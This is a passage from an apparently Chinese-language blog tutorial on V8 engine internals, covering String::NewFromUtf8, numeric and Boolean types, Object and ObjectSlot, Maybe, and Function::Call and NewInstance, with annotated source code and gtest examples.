id="newfromutf8">NewFromUtf8</h3><p>String数据类型有多个静态函数可以从一个<code>char*</code>指针建立起一个V8字符串数据，最常用的一个就是String的静态函数<code>NewFromUtf8</code>，其就是从一个UTF8数据中新建一个String数据。</p><p>一般用法如下为：<code>Local&lt;String&gt; str = String::NewFromUtf8(isolate_, "åäö").ToLocalChecked();</code></p><p>现在<code>String::NewFromUtf8</code>长这样：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MaybeLocal&lt;String&gt; <span class="hljs-title">String::NewFromUtf8</span><span class="hljs-params">(Isolate* isolate, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* data,</span></span><br><span class="hljs-params"><span class="hljs-function">                                       NewStringType type, <span class="hljs-type">int</span> length)</span> </span>&#123;<br>  <span class="hljs-built_in">NEW_STRING</span>(isolate, String, NewFromUtf8, <span class="hljs-type">char</span>, data, type, length);<br>  <span class="hljs-keyword">return</span> result;  <br>&#125;<br></code></pre></td></tr></table></figure><p><code>NEW_STRING</code>宏在<code>src/api/api.cc</code>中可以找到，可以用下述命令查看展开后的样子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">g++ -I./out/x64.release_gcc/gen -I./include -I. -E src/api/api.cc &gt; output<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MaybeLocal&lt;String&gt; <span class="hljs-title">String::NewFromUtf8</span><span class="hljs-params">(Isolate* isolate, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* data,</span></span><br><span class="hljs-params"><span class="hljs-function">                                       NewStringType type, <span class="hljs-type">int</span> length)</span> </span>&#123;<br>  MaybeLocal&lt;String&gt; result;<br>  <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) &#123;<br>    result = String::<span class="hljs-built_in">Empty</span>(isolate);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (length &gt; i::String::kMaxLength) &#123;<br>    result = <span class="hljs-built_in">MaybeLocal</span>&lt;String&gt;();<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    i::Isolate* i_isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;internal::Isolate*&gt;(isolate);<br>    i::VMState&lt;v8::OTHER&gt; __state__((i_isolate));;<br>    i::RuntimeCallTimerScope _runtime_timer( i_isolate, i::RuntimeCallCounterId::kAPI_String_NewFromUtf8);<br>    <span class="hljs-keyword">do</span> &#123;<br>      <span class="hljs-keyword">auto</span>&amp;&amp; logger = (i_isolate)-&gt;<span class="hljs-built_in">logger</span>();<br>      <span class="hljs-keyword">if</span> (logger-&gt;<span class="hljs-built_in">is_logging</span>())<br>        logger-&gt;<span class="hljs-built_in">ApiEntryCall</span>(<span class="hljs-string">&quot;v8::&quot;</span> <span class="hljs-string">&quot;String&quot;</span> <span class="hljs-string">&quot;::&quot;</span> <span class="hljs-string">&quot;NewFromUtf8&quot;</span>);<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">0</span>)<br>      length = <span class="hljs-built_in">StringLength</span>(data);<br>     i::Handle&lt;i::String&gt; handle_result = <span class="hljs-built_in">NewString</span>(i_isolate-&gt;<span class="hljs-built_in">factory</span>(), type, i::<span class="hljs-built_in">Vector</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">char</span>&gt;(data, length)) .<span class="hljs-built_in">ToHandleChecked</span>();<br>     result = Utils::<span class="hljs-built_in">ToLocal</span>(handle_result);<br>  &#125;;<br>  <span class="hljs-keyword">return</span> result;  <br>&#125;<br></code></pre></td></tr></table></figure><p>有很多的检查是不需要的，可以移到编译时检查，比如字符串的最大长度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-type">int</span> N&gt;<br><span class="hljs-function"><span class="hljs-type">static</span> V8_WARN_UNUSED_RESULT Local&lt;String&gt; <span class="hljs-title">NewFromUtf8Literal</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    Isolate* isolate, <span class="hljs-type">const</span> <span class="hljs-type">char</span> (&amp;literal)[N],</span></span><br><span class="hljs-params"><span class="hljs-function">    NewStringType type = NewStringType::kNormal)</span> </span>&#123;<br>  <span class="hljs-built_in">static_assert</span>(N &lt;= kMaxLength, <span class="hljs-string">&quot;String is too long&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">NewFromUtf8Literal</span>(isolate, literal, type, N - <span class="hljs-number">1</span>);      <br>&#125;<br></code></pre></td></tr></table></figure><p><code>static_assert</code>在编译时检查。</p><h2 id="数值类型">数值类型</h2><p>数值类型在V8中代表的意义很宽泛，有些中间数值类型从<code>Number</code>中继承出来，所以也属于V8的数值类型，如:</p><ul><li><code>Integer</code> 继承自<code>Number</code></li><li><code>Int32</code> 继承自<code>Integer</code></li><li><code>Uint32</code> 继承自<code>Integer</code></li></ul><p>关于数值类型的用法很简单，常用的无非是静态函数<code>New()</code>以及成员函数<code>Value()</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">Number::Value</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>; <span class="hljs-comment">// Value()函数声明，返回一个double数值</span><br><span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Number&gt; <span class="hljs-title">New</span><span class="hljs-params">(Isolate* isolate, <span class="hljs-type">double</span> value)</span></span>; <span class="hljs-comment">// New()函数声明</span><br></code></pre></td></tr></table></figure><p>相应地，<code>Integer</code>以及其他几个数值类型也有其相应的<code>New()</code>函数和<code>Value()</code>函数。不过值得注意的是<code>Integer::Value()</code>的返回值是<code>int64_t</code>类型的数据，但是在<code>New()</code>的时候传的却需要是<code>int32_t</code>或者<code>uint32_t</code>。</p><h2 id="布尔类型boolean">布尔类型（Boolean)</h2><p>布尔类型非常简单，常用的API和数值类型差不多，无非是<code>New()</code>和<code>Value()</code>两个，不同的是它们的参数或者返回值是一个<code>bool</code>类型罢了。</p><h2 id="对象object">对象（Object）</h2><p>对象继承自<code>TaggedImpl</code>，从<code>Object</code>出发，衍生了各种其他非元类型的数据类型，如数组、函数等：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Object</span> : <span class="hljs-keyword">public</span> TaggedImpl&lt;HeapObjectReferenceType::STRONG, Address&gt; &#123; <br></code></pre></td></tr></table></figure><p>对象可以用它默认的构造函数创建或者传入一个指向TaggedImpl的构造函数的地址。对象本身不包括任何成员，除了一个继承自TaggedImpl的<code>ptr_</code>，所以我们创建的Object在栈上类似于一个指向对象的指针。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">+------+<br>|Object|<br>|------|<br>|ptr_  |----&gt;<br>+------+<br></code></pre></td></tr></table></figure><p><code>ptr_</code>是一个StrongType，所以它可以是一个<code>smi</code>，此时它会包含一个像小整数的值：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">+------+<br>|Object|<br>|------|<br>|  18  |<br>+------+<br></code></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bitset&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects-inl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/slots.h&quot;</span></span><br><br><span class="hljs-keyword">namespace</span> i = v8::internal;<br><br><span class="hljs-built_in">TEST</span>(Object, Create) &#123;<br>  i::Object obj&#123;&#125;;<br>  <span class="hljs-built_in">EXPECT_EQ</span>(obj.<span class="hljs-built_in">ptr</span>(), i::kNullAddress);<br>  i::Object obj2&#123;<span class="hljs-number">18</span>&#125;;<br>  <span class="hljs-built_in">EXPECT_EQ</span>(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(obj<span class="hljs-number">2.</span><span class="hljs-built_in">ptr</span>()), <span class="hljs-number">18</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="objectslot">ObjectSlot</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">i::Object obj&#123;<span class="hljs-number">18</span>&#125;;<br>i::FullObjectSlot slot&#123;&amp;obj&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">+----------+      +---------+<br>|ObjectSlot|      | Object  |<br>|----------|      |---------|<br>| address  | ---&gt; |   18    |<br>+----------+      +---------+<br></code></pre></td></tr></table></figure><p>样例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bitset&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects-inl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/slots.h&quot;</span></span><br><br><span class="hljs-keyword">namespace</span> i = v8::internal;<br><br><span class="hljs-built_in">TEST</span>(ObjectSlot, Create) &#123;<br>  i::Object obj&#123;<span class="hljs-number">18</span>&#125;;<br>  i::FullObjectSlot slot&#123;&amp;obj&#125;;<br>  <span class="hljs-built_in">EXPECT_NE</span>(slot.<span class="hljs-built_in">address</span>(), obj.<span class="hljs-built_in">ptr</span>());<br>  <span class="hljs-built_in">EXPECT_EQ</span>(*slot, obj);<br><br>  i::Object* p = &amp;obj;<br>  i::Object** pp = &amp;p;<br>  <span class="hljs-built_in">EXPECT_EQ</span>(*slot, **pp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="maybe">Maybe</h3><p><code>Maybe</code>是一个简单的用于表现一个对象是否具值的数据类型，当一个API返回一个<code>Maybe&lt;&gt;</code>时，就说明它可能是一个布尔值，也可能是一个因为异常而得到的无值结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&gt;                                                              <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Maybe</span> &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function">V8_INLINE <span class="hljs-type">bool</span> <span class="hljs-title">IsNothing</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> !has_value_; &#125;                      <br>  <span class="hljs-function">V8_INLINE <span class="hljs-type">bool</span> <span class="hljs-title">IsJust</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> has_value_; &#125;<br>  ...<br><br> <span class="hljs-keyword">private</span>:<br>  <span class="hljs-type">bool</span> has_value_;                                                              <br>  T value_; <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Maybe&lt;&gt;</code>的数据类型有几个常用的函数：</p><ul><li><code>bool Maybe&lt;T&gt;::IsNothing() const</code> 是否具值</li><li><code>bool Maybe&lt;T&gt;::IsJust() const</code>与上面这个函数结果相反</li><li><code>T Maybe&lt;T&gt;::FromJust() const</code>返回它本体的值，如果不具值则直接崩溃</li><li><code>T Maybe&lt;T&gt;::FromMaybe(const Maybe&amp; default_value) const</code>返回它本体的值，如果不具值则返回<code>default_value</code></li></ul><p>样例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8_test_fixture.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> v8;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MaybeTest</span> : <span class="hljs-keyword">public</span> V8TestFixture &#123;<br>&#125;;<br><br><span class="hljs-built_in">TEST_F</span>(MaybeTest, Maybe) &#123;<br>  <span class="hljs-type">bool</span> cond = <span class="hljs-literal">true</span>;<br>  Maybe&lt;<span class="hljs-type">int</span>&gt; maybe = cond ? <span class="hljs-built_in">Just</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">10</span>) : <span class="hljs-built_in">Nothing</span>&lt;<span class="hljs-type">int</span>&gt;();<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(maybe.<span class="hljs-built_in">IsJust</span>());<br>  <span class="hljs-built_in">EXPECT_FALSE</span>(maybe.<span class="hljs-built_in">IsNothing</span>());<br>  maybe.<span class="hljs-built_in">Check</span>();<br><br>  <span class="hljs-type">int</span> nr = maybe.<span class="hljs-built_in">ToChecked</span>();<br>  <span class="hljs-built_in">EXPECT_EQ</span>(nr, <span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(maybe.<span class="hljs-built_in">FromJust</span>(), <span class="hljs-number">10</span>);<br><br>  Maybe&lt;<span class="hljs-type">int</span>&gt; nothing = <span class="hljs-built_in">Nothing</span>&lt;<span class="hljs-type">int</span>&gt;();<br>  <span class="hljs-type">int</span> value = nothing.<span class="hljs-built_in">FromMaybe</span>(<span class="hljs-number">22</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(value, <span class="hljs-number">22</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * I think the intention with a type Maybe&lt;void&gt; is that we don&#x27;t really</span><br><span class="hljs-comment"> * care/want to have a value in the Maybe apart from that is is empty or</span><br><span class="hljs-comment"> * something. So instead of having a bool and setting it to true just</span><br><span class="hljs-comment"> * have void and return an empty. I think this signals the intent of a</span><br><span class="hljs-comment"> * function better as one might otherwise wonder what the value in the maybe</span><br><span class="hljs-comment"> * represents.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function">Maybe&lt;<span class="hljs-type">void</span>&gt; <span class="hljs-title">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (x == <span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Nothing</span>&lt;<span class="hljs-type">void</span>&gt;();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">JustVoid</span>();<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(MaybeTest, MaybeVoid) &#123;<br>  Maybe&lt;<span class="hljs-type">void</span>&gt; maybe = <span class="hljs-built_in">JustVoid</span>();<br>  <span class="hljs-built_in">EXPECT_FALSE</span>(maybe.<span class="hljs-built_in">IsNothing</span>());<br><br>  Maybe&lt;<span class="hljs-type">void</span>&gt; maybe_nothing = <span class="hljs-built_in">Nothing</span>&lt;<span class="hljs-type">void</span>&gt;();<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(maybe_nothing.<span class="hljs-built_in">IsNothing</span>());<br><br>  <span class="hljs-built_in">EXPECT_TRUE</span>(<span class="hljs-built_in">doit</span>(<span class="hljs-number">-1</span>).<span class="hljs-built_in">IsNothing</span>());<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(<span class="hljs-built_in">doit</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">IsJust</span>());<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数function">函数（Function）</h2><p>别忘了函数也是对象的一种，所以说V8中的<code>Function</code>也是继承自<code>Object</code>的。对于外界传进来的<code>Value</code>类型的函数，读者能通过之前介绍过的<code>Local&lt;T&gt;::Cast</code>来将其转换成函数类型，也可以通过<code>CheckCast()</code>判断。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">void</span> v8::Function::<span class="hljs-built_in">CheckCast</span>(Value* that) &#123;<br>  i::Handle&lt;i::Object&gt; obj = Utils::<span class="hljs-built_in">OpenHandle</span>(that);<br>  Utils::<span class="hljs-built_in">ApiCheck</span>(obj-&gt;<span class="hljs-built_in">IsCallable</span>(), <span class="hljs-string">&quot;v8::Function::Cast&quot;</span>,<br>                  <span class="hljs-string">&quot;Value is not a Function&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>而对于一个已经是函数类型的数据来说，我们可以用以下一些常见的函数：</p><ul><li><code>Call()</code> 调用这个函数</li><li><code>NewInstance</code>相当于通过<code>new</code>的方式调用这个函数以得到类的实例。</li><li><code>Setname()</code> <code>GetName()</code> 设置获取函数名</li><li>具体可以看<code>src/api/api.cc</code></li></ul><p>这里主要介绍一下如何调用一个函数的数据类型。</p><h3 id="函数调用call">函数调用（Call）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MaybeLocal&lt;v8::Value&gt; <span class="hljs-title">Function::Call</span><span class="hljs-params">(Local&lt;Context&gt; context,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     v8::Local&lt;v8::Value&gt; recv, <span class="hljs-type">int</span> argc,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     v8::Local&lt;v8::Value&gt; argv[])</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(context-&gt;<span class="hljs-built_in">GetIsolate</span>());<br>  <span class="hljs-built_in">TRACE_EVENT_CALL_STATS_SCOPED</span>(isolate, <span class="hljs-string">&quot;v8&quot;</span>, <span class="hljs-string">&quot;V8.Execute&quot;</span>);<br>  <span class="hljs-built_in">ENTER_V8</span>(isolate, context, Function, Call, <span class="hljs-built_in">MaybeLocal</span>&lt;Value&gt;(),<br>           InternalEscapableScope);<br>  <span class="hljs-function">i::TimerEventScope&lt;i::TimerEventExecute&gt; <span class="hljs-title">timer_scope</span><span class="hljs-params">(isolate)</span></span>;<br>  <span class="hljs-keyword">auto</span> self = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  Utils::<span class="hljs-built_in">ApiCheck</span>(!self.<span class="hljs-built_in">is_null</span>(), <span class="hljs-string">&quot;v8::Function::Call&quot;</span>,<br>                  <span class="hljs-string">&quot;Function to be called is a null pointer&quot;</span>);<br>  i::Handle&lt;i::Object&gt; recv_obj = Utils::<span class="hljs-built_in">OpenHandle</span>(*recv);<br>  <span class="hljs-built_in">STATIC_ASSERT</span>(<span class="hljs-built_in">sizeof</span>(v8::Local&lt;v8::Value&gt;) == <span class="hljs-built_in">sizeof</span>(i::Handle&lt;i::Object&gt;));<br>  i::Handle&lt;i::Object&gt;* args = <span class="hljs-keyword">reinterpret_cast</span>&lt;i::Handle&lt;i::Object&gt;*&gt;(argv);<br>  Local&lt;Value&gt; result;<br>  has_pending_exception = !<span class="hljs-built_in">ToLocal</span>&lt;Value&gt;(<br>      i::Execution::<span class="hljs-built_in">Call</span>(isolate, self, recv_obj, argc, args), &amp;result);<br>  <span class="hljs-built_in">RETURN_ON_FAILED_EXECUTION</span>(Value);<br>  <span class="hljs-built_in">RETURN_ESCAPED</span>(result);<br>&#125;<br></code></pre></td></tr></table></figure><p>各参数含义如下：</p><ul><li><code>context</code> 上下文</li><li><code>recv</code> 相当于被调用函数内部的<code>this</code></li><li><code>argc</code> 这次函数调用的参数个数</li><li><code>argv</code>与参数个数对应的参数数组，以本地<code>Value</code>句柄的形式出现。</li></ul><h3id="构造函数的实例化newinstance">构造函数的实例化（NewInstance）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MaybeLocal&lt;Object&gt; <span class="hljs-title">Function::NewInstance</span><span class="hljs-params">(Local&lt;Context&gt; context, <span class="hljs-type">int</span> argc,</span></span><br><span class="hljs-params"><span class="hljs-function">                                         v8::Local&lt;v8::Value&gt; argv[])</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">NewInstanceWithSideEffectType</span>(context, argc, argv,<br>                                       SideEffectType::kHasSideEffect);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>NewInstanceWithSideEffectType()</code>生成</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MaybeLocal&lt;Object&gt; <span class="hljs-title">Function::NewInstanceWithSideEffectType</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    Local&lt;Context&gt; context, <span class="hljs-type">int</span> argc, v8::Local&lt;v8::Value&gt; argv[],</span></span><br><span class="hljs-params"><span class="hljs-function">    SideEffectType side_effect_type)</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(context-&gt;<span class="hljs-built_in">GetIsolate</span>());<br>  <span class="hljs-built_in">TRACE_EVENT_CALL_STATS_SCOPED</span>(isolate, <span class="hljs-string">&quot;v8&quot;</span>, <span class="hljs-string">&quot;V8.Execute&quot;</span>);<br>  <span class="hljs-built_in">ENTER_V8</span>(isolate, context, Function, NewInstance, <span class="hljs-built_in">MaybeLocal</span>&lt;Object&gt;(),<br>           InternalEscapableScope);<br>  <span class="hljs-function">i::TimerEventScope&lt;i::TimerEventExecute&gt; <span class="hljs-title">timer_scope</span><span class="hljs-params">(isolate)</span></span>;<br>  <span class="hljs-keyword">auto</span> self = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  <span class="hljs-built_in">STATIC_ASSERT</span>(<span class="hljs-built_in">sizeof</span>(v8::Local&lt;v8::Value&gt;) == <span class="hljs-built_in">sizeof</span>(i::Handle&lt;i::Object&gt;));<br>  <span class="hljs-type">bool</span> should_set_has_no_side_effect =<br>      side_effect_type == SideEffectType::kHasNoSideEffect &amp;&amp;<br>      isolate-&gt;<span class="hljs-built_in">debug_execution_mode</span>() == i::DebugInfo::kSideEffects;<br>  <span class="hljs-keyword">if</span> (should_set_has_no_side_effect) &#123;<br>    <span class="hljs-built_in">CHECK</span>(self-&gt;<span class="hljs-built_in">IsJSFunction</span>() &amp;&amp;<br>          i::JSFunction::<span class="hljs-built_in">cast</span>(*self).<span class="hljs-built_in">shared</span>().<span class="hljs-built_in">IsApiFunction</span>());<br>    i::Object obj =<br>        i::JSFunction::<span class="hljs-built_in">cast</span>(*self).<span class="hljs-built_in">shared</span>().<span class="hljs-built_in">get_api_func_data</span>().<span class="hljs-built_in">call_code</span>(<br>            kAcquireLoad);<br>    <span class="hljs-keyword">if</span> (obj.<span class="hljs-built_in">IsCallHandlerInfo</span>()) &#123;<br>      i::CallHandlerInfo handler_info = i::CallHandlerInfo::<span class="hljs-built_in">cast</span>(obj);<br>      <span class="hljs-keyword">if</span> (!handler_info.<span class="hljs-built_in">IsSideEffectFreeCallHandlerInfo</span>()) &#123;<br>        handler_info.<span class="hljs-built_in">SetNextCallHasNoSideEffect</span>();<br>      &#125;<br>    &#125;<br>  &#125;<br>  i::Handle&lt;i::Object&gt;* args = <span 